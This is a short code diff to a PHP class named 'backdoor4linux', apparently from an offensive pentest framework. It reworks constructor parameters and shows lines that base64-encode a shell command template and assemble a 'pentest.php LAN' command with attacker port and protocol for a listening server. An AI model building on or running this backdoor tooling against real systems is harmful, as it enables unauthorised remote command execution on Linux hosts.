@@ -7,8 +7,8 @@ class backdoor4linux extends root4linux4com{
 
   
 
-    public function __construct($eth,$domain,$ip,$port,$protocol,$stream,$templateB64_id,$templateB64_cmd,$templateB64_shell,$uid,$uid_name,$gid,$gid_name,$context,$uid_pass) {
-        parent::__construct($eth,$domain,$ip,$port,$protocol,$stream,$templateB64_id,$templateB64_cmd,$templateB64_shell,$uid,$uid_name,$gid,$gid_name,$context,$uid_pass);
+    public function __construct($eth,$domain,$ip,$port,$protocol,$stream,$templateB64_id,$templateB64_cmd,$templateB64_shell,$id8b64,$uid_pass) {
+        parent::__construct($eth,$domain,$ip,$port,$protocol,$stream,$templateB64_id,$templateB64_cmd,$templateB64_shell,$id8b64,$uid_pass);
     }
     
     
@@ -251,7 +251,6 @@ This can be handy to get a list of processes and their PID number.");
         $this->lan2stream4result($query,$this->stream_timeout);
         $templateB64_shell = base64_encode(str_replace("%SHELL%", $query, $this->template_shell));
         
-        //$obj_lan = new check4linux($this->eth,$this->domain,$this->ip, $this->port, $this->protocol,$this->stream, $templateB64_id,$templateB64_cmd,$templateB64_shell,$uid,$uid_name,$gid,$gid_name,$context,$user_name_pass);
         
         
         $cmd1 = "php pentest.php LAN \"$this->eth $this->domain $this->ip $this->port $this->protocol $attacker_port $attacker_protocol $templateB64_cmd $templateB64_shell server 60 listening_Server\" ";
